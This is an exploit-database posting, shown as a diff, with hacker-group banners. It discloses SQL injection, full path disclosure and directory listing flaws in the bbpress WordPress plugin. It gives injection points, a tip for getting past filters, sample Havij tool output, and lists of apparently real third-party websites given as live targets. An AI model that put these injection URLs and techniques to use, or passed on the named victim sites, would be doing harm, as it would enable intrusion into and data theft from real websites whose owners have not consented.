@@ -1,0 +1,94 @@
+# 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+# 0      _                   __           __       __                      1
+# 1    /' \            __  /'__`\        /\ \__  /'__`\                    0
+# 0   /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___            1
+# 1   \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\           0
+# 0      \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/            1
+# 1       \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\            0
+# 0        \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/            1
+# 1                   \ \____/ >> Exploit database separated by exploit    0
+# 0                    \/___/          type (local, remote, DoS, etc.)     1
+# 1                                                                        1
+# 0   [x] Official Website: http://www.1337day.com                         0
+# 1   [x] Support E-mail  : mr.inj3ct0r[at]gmail[dot]com                   1
+# 0                                                                        0
+# 1               ==========================================               1
+# 0                   I'm Dark-Puzzle From Inj3ct0r TEAM                   0
+# 0                                                                        1
+# 1                       dark-puzzle[at]live[at]fr                        0
+# 0               ==========================================               1
+# 1                              White Hat                                 1
+# 0                         Independant Pentester                          0
+# 1                      exploit coder/bug researcher                      0
+# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-1
+     
+# Exploit Title: Wordpress plugins - bbpress Multiple Vulnerabilities.
+# Date: 31 August 2012
+# Author: Dark-Puzzle (Souhail Hammou)
+# Vendor Website : www.bbpress.ru / www.bbpress.com
+# Risk : Critical
+# Version: All Versions SQL injection
+# Google Dork : N/A
+# Category: Webapps/0day
+# Tested on: Windows Xp Sp2 , Backtrack 5 R3 .
+# Gr337ings to : Inj3ct0r Team - Packetstormsecurity.org - Securityfocus.com - Jigsaw - Dark-Soldier ...
+
+----------------------------------------------------
+I - SQL Injection Vulnerability :
+----------------------------------------------------
+bbpress plugin is prone to an SQL injection Vulnerability .
+In cases when you face a valid string column problem try to change syntax or instead spaces add /**/ .
+
+Note: Automated injection can be more effective .
+
+Proof : ( take Havij for example)
+
+Host IP: 127.0.0.1
+Web Server: Apache
+Keyword Found: bb
+Injection type is Integer
+Keyword corrected: 0.062
+DB Server: MySQL unknown ver
+Trying another method using keyword for finding columns count
+Selected Column Count is 12
+trying to find string column
+Valid String Column is 3
+Current DB: test_db
+
+Example Sites :
+http://marcoemarco.altervista.org/wp-content/plugins/bbpress/forum.php?id=1&page=[Inject Here]
+http://www.compagniealluna.com/wp-content/plugins/bbpress/forum.php?id=1&page=[Inject here] 
+
+---------------------------------------------------
+II - Full Disclosure Vulnerability :
+---------------------------------------------------
+
+The Full Path Disclosure vulnerability in bbpress is via Array .
+
+Example :
+
+www.example.com/path/bbpress/topic.php?id[]=12&replies=3
+
+Error : Warning: urlencode() expects parameter 1 to be string, array given in /Full/Path/Here on line 786
+
+Live Example Sites :
+
+http://www.compagniealluna.com/wp-content/plugins/bbpress/topic.php?id[]=1017&replies=1
+http://kghf.ru/wp-content/plugins/bbpress/topic.php?id[]=70&replies=1
+http://tg.elsendorf.de/wp/wp-content/plugins/bbpress/topic.php?id[]=501&replies=1
+http://tg.elsendorf.de/wp/wp-content/plugins/bbpress/forum.php?id[]=1
+
+---------------------------------------------------
+III - Directory Listing Vulnerability :
+---------------------------------------------------
+
+www.example.com/PATH/bbpress/bb-templates/kakumei/
+www.example.com/PATH/bbpress/bb-templates/kakumei-blue/
+
+---------------------------------------------------
+# Datasec Team
+
+
+
+
+
